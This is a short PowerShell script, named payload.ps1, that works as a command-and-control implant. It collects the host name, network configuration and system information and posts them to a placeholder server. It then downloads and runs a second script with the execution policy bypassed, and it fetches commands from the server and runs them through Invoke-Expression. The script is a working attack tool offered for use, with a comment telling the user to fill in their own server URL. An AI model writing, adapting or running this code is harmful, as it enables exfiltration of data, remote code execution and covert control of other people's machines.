# payload.ps1
# Write a message to the local system as a log
Write-Output "Executing C2 tasks on $(hostname)" | Out-File -FilePath "C:\Users\Public\c2_log.txt" -Append

# Task 1: Gather system information
$hostname = hostname
$ipconfig = ipconfig
$systeminfo = systeminfo

# Combine information into one variable and save it to a file
$info = "Hostname: $hostname`nIP Config:`n$ipconfig`nSystem Info:`n$systeminfo"
$info | Out-File -FilePath "C:\Users\Public\sysinfo.txt"

# Task 2: Send the system information file back to the C2 server
$server = "http://yourserver.com/upload_endpoint"  # Replace with your server URL
Invoke-WebRequest -Uri $server -Method Post -InFile "C:\Users\Public\sysinfo.txt" -ContentType "multipart/form-data"

# Task 3: Download and execute an additional payload (e.g., payload2.ps1)
$payloadUri = "http://yourserver.com/payload2.ps1"
Invoke-WebRequest -Uri $payloadUri -OutFile "C:\Users\Public\payload2.ps1"
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File C:\Users\Public\payload2.ps1"

# Task 4: Execute additional commands or commands from C2 server
$commandUri = "http://yourserver.com/commands.txt"
$commands = Invoke-WebRequest -Uri $commandUri | Select-Object -ExpandProperty Content
Invoke-Expression $commands  # Execute commands received from the server
